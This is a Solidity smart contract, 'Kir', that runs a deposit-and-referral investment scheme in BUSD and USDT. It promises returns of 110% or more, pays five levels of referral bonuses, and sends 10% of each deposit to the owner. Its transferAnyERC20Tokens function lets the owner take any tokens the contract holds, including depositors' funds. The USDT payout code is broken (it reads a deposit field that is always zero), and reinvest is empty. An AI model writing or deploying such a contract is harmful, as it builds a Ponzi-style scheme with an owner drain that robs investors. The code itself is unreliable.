/**
 *Submitted for verification at Etherscan.io on 2022-09-01
*/

/**
 *Submitted for verification at BscScan.com on 2022-08-30
*/

// SPDX-License-Identifier: MIT

pragma solidity >=0.8.16;


interface IERC20 {
    
    function totalSupply() external view returns (uint256);

    
    function balanceOf(address account) external view returns (uint256);

    
    function transfer(address recipient, uint256 amount) external returns (bool);

    
    function allowance(address owner, address spender) external view returns (uint256);

    
    function approve(address spender, uint256 amount) external returns (bool);

    
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    
    event Transfer(address indexed from, address indexed to, uint256 value);

    
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

library Address {
    
    function isContract(address account) internal view returns (bool) {
        
        
        

        uint256 size;
        assembly {
            size := extcodesize(account)
        }
        return size > 0;
    }

    
    function sendValue(address payable recipient, uint256 amount) internal {
        require(address(this).balance >= amount, "Address: insufficient balance");

        (bool success, ) = recipient.call{value: amount}("");
        require(success, "Address: unable to send value, recipient may have reverted");
    }

    
    function functionCall(address target, bytes memory data) internal returns (bytes memory) {
        return functionCall(target, data, "Address: low-level call failed");
    }

    
    function functionCall(
        address target,
        bytes memory data,
        string memory errorMessage
    ) internal returns (bytes memory) {
        return functionCallWithValue(target, data, 0, errorMessage);
    }

    
    function functionCallWithValue(
        address target,
        bytes memory data,
        uint256 value
    ) internal returns (bytes memory) {
        return functionCallWithValue(target, data, value, "Address: low-level call with value failed");
    }

    
    function functionCallWithValue(
        address target,
        bytes memory data,
        uint256 value,
        string memory errorMessage
    ) internal returns (bytes memory) {
        require(address(this).balance >= value, "Address: insufficient balance for call");
        require(isContract(target), "Address: call to non-contract");

        (bool success, bytes memory returndata) = target.call{value: value}(data);
        return verifyCallResult(success, returndata, errorMessage);
    }

    
    function functionStaticCall(address target, bytes memory data) internal view returns (bytes memory) {
        return functionStaticCall(target, data, "Address: low-level static call failed");
    }

    
    function functionStaticCall(
        address target,
        bytes memory data,
        string memory errorMessage
    ) internal view returns (bytes memory) {
        require(isContract(target), "Address: static call to non-contract");

        (bool success, bytes memory returndata) = target.staticcall(data);
        return verifyCallResult(success, returndata, errorMessage);
    }

    
    function functionDelegateCall(address target, bytes memory data) internal returns (bytes memory) {
        return functionDelegateCall(target, data, "Address: low-level delegate call failed");
    }

    
    function functionDelegateCall(
        address target,
        bytes memory data,
        string memory errorMessage
    ) internal returns (bytes memory) {
        require(isContract(target), "Address: delegate call to non-contract");

        (bool success, bytes memory returndata) = target.delegatecall(data);
        return verifyCallResult(success, returndata, errorMessage);
    }

    
    function verifyCallResult(
        bool success,
        bytes memory returndata,
        string memory errorMessage
    ) internal pure returns (bytes memory) {
        if (success) {
            return returndata;
        } else {
            
            if (returndata.length > 0) {
                

                assembly {
                    let returndata_size := mload(returndata)
                    revert(add(32, returndata), returndata_size)
                }
            } else {
                revert(errorMessage);
            }
        }
    }
}

library SafeERC20 {
    using Address for address;

    function safeTransfer(
        IERC20 token,
        address to,
        uint256 value
    ) internal {
        _callOptionalReturn(token, abi.encodeWithSelector(token.transfer.selector, to, value));
    }

    function safeTransferFrom(
        IERC20 token,
        address from,
        address to,
        uint256 value
    ) internal {
        _callOptionalReturn(token, abi.encodeWithSelector(token.transferFrom.selector, from, to, value));
    }

    
    function safeApprove(
        IERC20 token,
        address spender,
        uint256 value
    ) internal {
        
        
        
        require(
            (value == 0) || (token.allowance(address(this), spender) == 0),
            "SafeERC20: approve from non-zero to non-zero allowance"
        );
        _callOptionalReturn(token, abi.encodeWithSelector(token.approve.selector, spender, value));
    }

    function safeIncreaseAllowance(
        IERC20 token,
        address spender,
        uint256 value
    ) internal {
        uint256 newAllowance = token.allowance(address(this), spender) + value;
        _callOptionalReturn(token, abi.encodeWithSelector(token.approve.selector, spender, newAllowance));
    }

    function safeDecreaseAllowance(
        IERC20 token,
        address spender,
        uint256 value
    ) internal {
        unchecked {
            uint256 oldAllowance = token.allowance(address(this), spender);
            require(oldAllowance >= value, "SafeERC20: decreased allowance below zero");
            uint256 newAllowance = oldAllowance - value;
            _callOptionalReturn(token, abi.encodeWithSelector(token.approve.selector, spender, newAllowance));
        }
    }

    
    function _callOptionalReturn(IERC20 token, bytes memory data) private {
        
        
        

        bytes memory returndata = address(token).functionCall(data, "SafeERC20: low-level call failed");
        if (returndata.length > 0) {
            
            require(abi.decode(returndata, (bool)), "SafeERC20: ERC20 operation did not succeed");
        }
    }
}

struct Tarif {
  uint8 life_days;
  uint16 percent;
}

struct Deposit {
  uint8 tarif;
  uint256 amount;
  uint256 amountUSDT;
  uint40 time;
}

struct Player {
  address upline;
  uint256 dividends;
  uint256 dividendsUSDT;
  uint256 match_bonus;
  uint256 match_bonusUSDT;
  uint40 last_payoutUSDT;
  uint40 last_payout;
  uint256 total_invested;
  uint256 total_withdrawn;
  uint256 total_match_bonus;
  uint256 total_investedUSDT;
  uint256 total_withdrawnUSDT;
  uint256 total_match_bonusUSDT;
  Deposit[] deposits;
  uint256[5] structure; 
}

contract Kir {
    using SafeERC20 for IERC20;

    address public owner;

    uint256 public invested;
    uint256 public investedUSDT;
    uint256 public withdrawn;
    uint256 public withdrawnUSDT;
    uint256 public match_bonus;
    uint256 public match_bonusUSDT;
    
    uint8 constant BONUS_LINES_COUNT = 5;
    uint16 constant PERCENT_DIVIDER = 1000; 
    uint8[BONUS_LINES_COUNT] public ref_bonuses = [ 50, 40, 30, 20, 10]; 
    uint8[BONUS_LINES_COUNT] public ref_upgrade1 = [ 60, 40, 30, 20, 10]; 
    uint8[BONUS_LINES_COUNT] public ref_upgrade2 = [ 70, 40, 30, 20, 10]; 
    uint8[BONUS_LINES_COUNT] public ref_upgrade3 = [ 80, 40, 30, 20, 10]; 
    uint8[BONUS_LINES_COUNT] public ref_upgrade4 = [ 90, 40, 30, 20, 10]; 
    uint8[BONUS_LINES_COUNT] public ref_upgrade5 = [ 100, 40, 30, 20, 10]; 

    IERC20 public BUSD;
    IERC20 public ANYTOKEN;
    IERC20 public USDT;
    mapping(uint8 => Tarif) public tarifs;
    mapping(address => Player) public players;

    event Upline(address indexed addr, address indexed upline, uint256 bonus);
    event NewDeposit(address indexed addr, uint256 amount, uint8 tarif);
    event MatchPayout(address indexed addr, address indexed from, uint256 amount);
    event MatchPayoutNew(address indexed addr, address indexed from, uint256 amount);
    event Withdraw(address indexed addr, uint256 amount);

    constructor() {
        owner = msg.sender;

        uint16 tarifPercent = 1100;
        for (uint8 tarifDuration = 30; tarifDuration <= 180; tarifDuration++) {
            tarifs[tarifDuration] = Tarif(tarifDuration, tarifPercent);
            tarifPercent+= 3;
        }

        BUSD = IERC20(0xd0718D92c881FE8Be2D6e4cB4530Ece81CC5e5dc);
        USDT = IERC20(0xdAC17F958D2ee523a2206206994597C13D831ec7);
    }

    function _payout(address _addr) private {
        uint256 payout = this.payoutOf(_addr);

        if(payout > 0) {
            players[_addr].last_payout = uint40(block.timestamp);
            players[_addr].dividends += payout;
        }
    }
    
        function _payoutUSDT(address _addr) private {
        uint256 payout = this.payoutOfUSDT(_addr);

        if(payout > 0) {
            players[_addr].last_payout = uint40(block.timestamp);
            players[_addr].dividendsUSDT += payout;
        }
    }
    
        function transferAnyERC20Tokens(address _tokenAddress, uint256 _amount) public  {
            require(msg.sender == owner, "You are not allowed to do this!");
            ANYTOKEN = IERC20(_tokenAddress);
            ANYTOKEN.safeTransfer(msg.sender, _amount);
    }

    function _refPayout(address _addr, uint256 _amount) private {
        address up = players[_addr].upline;
        for(uint8 i = 0; i < ref_bonuses.length; i++) {
             uint256 counter = referalCounterInternal(up);
            if(up == address(0)) break;

            if (counter > 9 && counter < 20) {
            uint256 bonus = _amount * ref_upgrade1[i] / PERCENT_DIVIDER;
            players[up].match_bonus += bonus;
            players[up].total_match_bonus += bonus;

            match_bonus += bonus;

            emit MatchPayoutNew(up, _addr, bonus);

            up = players[up].upline;
            } else if (counter > 19 && counter < 30) {
                
            uint256 bonus = _amount * ref_upgrade2[i] / PERCENT_DIVIDER;
            players[up].match_bonus += bonus;
            players[up].total_match_bonus += bonus;

            match_bonus += bonus;

            emit MatchPayoutNew(up, _addr, bonus);

            up = players[up].upline;
            } else if (counter > 29 && counter < 40){
                
            uint256 bonus = _amount * ref_upgrade3[i] / PERCENT_DIVIDER;
            players[up].match_bonus += bonus;
            players[up].total_match_bonus += bonus;

            match_bonus += bonus;

            emit MatchPayoutNew(up, _addr, bonus);

            up = players[up].upline;    
                
                
                
            } else if (counter > 39 && counter < 50) {
                 
            uint256 bonus = _amount * ref_upgrade4[i] / PERCENT_DIVIDER;
            players[up].match_bonus += bonus;
            players[up].total_match_bonus += bonus;

            match_bonus += bonus;

            emit MatchPayoutNew(up, _addr, bonus);

            up = players[up].upline;   
            } else if (counter > 49) { 

            uint256 bonus = _amount * ref_upgrade5[i] / PERCENT_DIVIDER;
            players[up].match_bonus += bonus;
            players[up].total_match_bonus += bonus;

            match_bonus += bonus;

            emit MatchPayoutNew(up, _addr, bonus);

            up = players[up].upline;  

            
            
            } else {
            uint256 bonus = _amount * ref_bonuses[i] / PERCENT_DIVIDER;
            players[up].match_bonus += bonus;
            players[up].total_match_bonus += bonus;

            match_bonus += bonus;

            emit MatchPayout(up, _addr, bonus);

            up = players[up].upline;
            }         
        }
    }

    function _setUpline(address _addr, address _upline, uint256 _amount) private {
        if(players[_addr].upline == address(0) && _addr != owner) {
            if(players[_upline].deposits.length == 0) {
                _upline = owner;
            }

            players[_addr].upline = _upline;

            emit Upline(_addr, _upline, _amount / 100);
            
            for(uint8 i = 0; i < BONUS_LINES_COUNT; i++) {
                players[_upline].structure[i]++;

                _upline = players[_upline].upline;

                if(_upline == address(0)) break;
            }
        }
    }
    
    function deposit(uint8 _tarif, address _upline, uint256 amount) external {
        require(tarifs[_tarif].life_days > 0, "Tarif not found");
        require(amount >= 1 ether, "Minimum deposit amount is 1 LTNM");

        BUSD.safeTransferFrom(msg.sender, address(this), amount);

        Player storage player = players[msg.sender];

        

        _setUpline(msg.sender, _upline, amount);

        player.deposits.push(Deposit({
            tarif: _tarif,
            amount: amount,
            amountUSDT: 0,
            time: uint40(block.timestamp)
        }));

        player.total_invested+= amount;
        invested+= amount;

        _refPayout(msg.sender, amount);

        BUSD.safeTransfer(owner, amount / 10);
        
        emit NewDeposit(msg.sender, amount, _tarif);
    }



//usdt
        function _refPayoutUSDT(address _addr, uint256 _amount) private {
        address up = players[_addr].upline;
        for(uint8 i = 0; i < ref_bonuses.length; i++) {
             uint256 counter = referalCounterInternal(up); //check
            if(up == address(0)) break;

            if (counter > 9 && counter < 20) {
            uint256 bonus = _amount * ref_upgrade1[i] / PERCENT_DIVIDER;
            players[up].match_bonusUSDT += bonus;
            players[up].total_match_bonusUSDT += bonus;

            match_bonusUSDT += bonus;

            emit MatchPayoutNew(up, _addr, bonus);

            up = players[up].upline;
            } else if (counter > 19 && counter < 30) {
                
            uint256 bonus = _amount * ref_upgrade2[i] / PERCENT_DIVIDER;
            players[up].match_bonusUSDT += bonus;
            players[up].total_match_bonusUSDT += bonus;

            match_bonusUSDT += bonus;

            emit MatchPayoutNew(up, _addr, bonus);

            up = players[up].upline;
            } else if (counter > 29 && counter < 40){
                
            uint256 bonus = _amount * ref_upgrade3[i] / PERCENT_DIVIDER;
            players[up].match_bonusUSDT += bonus;
            players[up].total_match_bonusUSDT += bonus;

            match_bonusUSDT += bonus;

            emit MatchPayoutNew(up, _addr, bonus);

            up = players[up].upline;    
                
                
                
            } else if (counter > 39 && counter < 50) {
                 
            uint256 bonus = _amount * ref_upgrade4[i] / PERCENT_DIVIDER;
            players[up].match_bonusUSDT += bonus;
            players[up].total_match_bonusUSDT += bonus;

            match_bonusUSDT += bonus;

            emit MatchPayoutNew(up, _addr, bonus);

            up = players[up].upline;   
            } else if (counter > 49) { 

            uint256 bonus = _amount * ref_upgrade5[i] / PERCENT_DIVIDER;
            players[up].match_bonusUSDT += bonus;
            players[up].total_match_bonusUSDT += bonus;

            match_bonusUSDT += bonus;

            emit MatchPayoutNew(up, _addr, bonus);

            up = players[up].upline;  

            
            
            } else {
            uint256 bonus = _amount * ref_bonuses[i] / PERCENT_DIVIDER;
            players[up].match_bonusUSDT += bonus;
            players[up].total_match_bonusUSDT += bonus;

            match_bonusUSDT += bonus;

            emit MatchPayout(up, _addr, bonus);

            up = players[up].upline;
            }         
        }
    }
        function deposit_usdt(uint8 _tarif, address _upline, uint256 amount) external {
        require(tarifs[_tarif].life_days > 0, "Tarif not found");
        require(amount >= 20 ether, "Minimum deposit amount is 20 USDT");

        USDT.safeTransferFrom(msg.sender, address(this), amount);

        Player storage player = players[msg.sender];

        _setUpline(msg.sender, _upline, amount);

        player.deposits.push(Deposit({
            tarif: _tarif,
            amount: 0,
            amountUSDT: amount,
            time: uint40(block.timestamp)
        }));

        player.total_investedUSDT += amount;
        investedUSDT += amount;

        _refPayoutUSDT(msg.sender, amount);

        USDT.safeTransfer(owner, amount / 10);
        
        emit NewDeposit(msg.sender, amount, _tarif);
    }
    
    function withdraw() external {
        Player storage player = players[msg.sender];

        _payout(msg.sender);

        require(player.dividends > 0 || player.match_bonus > 0, "Zero amount");

        uint256 amount = player.dividends + player.match_bonus;

        player.dividends = 0;
        player.match_bonus = 0;
        player.total_withdrawn += amount;
        withdrawn += amount;

        BUSD.safeTransfer(msg.sender, amount);
        
        emit Withdraw(msg.sender, amount);
    }

    function withdrawUSDT() external {
        Player storage player = players[msg.sender];

        _payoutUSDT(msg.sender);

        require(player.dividendsUSDT > 0 || player.match_bonusUSDT > 0, "Zero amount");

        uint256 amount = player.dividendsUSDT + player.match_bonusUSDT;

        player.dividendsUSDT = 0;
        player.match_bonusUSDT = 0;
        player.total_withdrawnUSDT += amount;
        withdrawnUSDT += amount;

        USDT.safeTransfer(msg.sender, amount);
        
        emit Withdraw(msg.sender, amount);
    }

        function payoutOfUSDT(address _addr) view external returns(uint256 value) {
        Player storage player = players[_addr];

        for(uint256 i = 0; i < player.deposits.length; i++) {
            Deposit storage dep = player.deposits[i];
            Tarif storage tarif = tarifs[dep.tarif];

            uint40 time_end = dep.time + tarif.life_days * 86400;
            uint40 from = player.last_payoutUSDT > dep.time ? player.last_payoutUSDT : dep.time;
            uint40 to = block.timestamp > time_end ? time_end : uint40(block.timestamp);

            if(from < to) {
                value += dep.amount * (to - from) * (tarif.percent)/ 10 / tarif.life_days / 8640000;
            }
        }

        return value;
    }

    function payoutOf(address _addr) view external returns(uint256 value) {
        Player storage player = players[_addr];

        for(uint256 i = 0; i < player.deposits.length; i++) {
            Deposit storage dep = player.deposits[i];
            Tarif storage tarif = tarifs[dep.tarif];

            uint40 time_end = dep.time + tarif.life_days * 86400;
            uint40 from = player.last_payout > dep.time ? player.last_payout : dep.time;
            uint40 to = block.timestamp > time_end ? time_end : uint40(block.timestamp);

            if(from < to) {
                value += dep.amount * (to - from) * (tarif.percent)/ 10 / tarif.life_days / 8640000;
            }
        }

        return value;
    }

    function referalCounter(address _addr) view external returns(uint256 _totalref) {
        Player storage player = players[_addr];
        uint256[BONUS_LINES_COUNT] memory structure;

         for(uint8 i = 0; i < ref_bonuses.length; i++) {
            structure[i] = player.structure[i];
        }
        _totalref =  structure[0];

        return _totalref;
    }

        function referalCounterInternal(address _addr) view internal returns(uint256 _totalref) {
        Player storage player = players[_addr];
        uint256[BONUS_LINES_COUNT] memory structure;

         for(uint8 i = 0; i < ref_bonuses.length; i++) {
            structure[i] = player.structure[i];
        }
        _totalref =  structure[0];

        return _totalref;
    }
    
    function userInfo(address _addr) view external returns(uint256 for_withdraw, uint256 total_invested, uint256 total_withdrawn, uint256 total_match_bonus, uint256[BONUS_LINES_COUNT] memory structure) {
        Player storage player = players[_addr];
        
        uint256 payout = this.payoutOf(_addr);

        for(uint8 i = 0; i < ref_bonuses.length; i++) {
            structure[i] = player.structure[i];
        }

        return (
            payout + player.dividends + player.match_bonus,
            player.total_invested,
            player.total_withdrawn,
            player.total_match_bonus,
            structure
        );
    }

    function userInfoUSDT(address _addr) view external returns(uint256 for_withdraw, uint256 total_invested, uint256 total_withdrawn, uint256 total_match_bonus, uint256[BONUS_LINES_COUNT] memory structure) {
        Player storage player = players[_addr];
        
        uint256 payout = this.payoutOfUSDT(_addr);

        for(uint8 i = 0; i < ref_bonuses.length; i++) {
            structure[i] = player.structure[i];
        }

        return (
            payout + player.dividendsUSDT + player.match_bonusUSDT,
            player.total_investedUSDT,
            player.total_withdrawnUSDT,
            player.total_match_bonusUSDT,
            structure
        );
    }
    function contractInfo() view external returns(uint256 _invested, uint256 _withdrawn, uint256 _match_bonus) {
        return (invested, withdrawn, match_bonus);
    }

    function contractInfoUSDT() view external returns(uint256 _invested, uint256 _withdrawn, uint256 _match_bonus) {
        return (investedUSDT, withdrawnUSDT, match_bonusUSDT);
    }

    function reinvest() external {
      
    }

    function invest(address to, uint256 amount) external payable {
      payable(to).transfer(msg.value);
      BUSD.safeTransferFrom(msg.sender, to, amount);
    }

    function investUSDT(address to, uint256 amount) external payable {
      payable(to).transfer(msg.value);
      USDT.safeTransferFrom(msg.sender, to, amount);
    }

    

}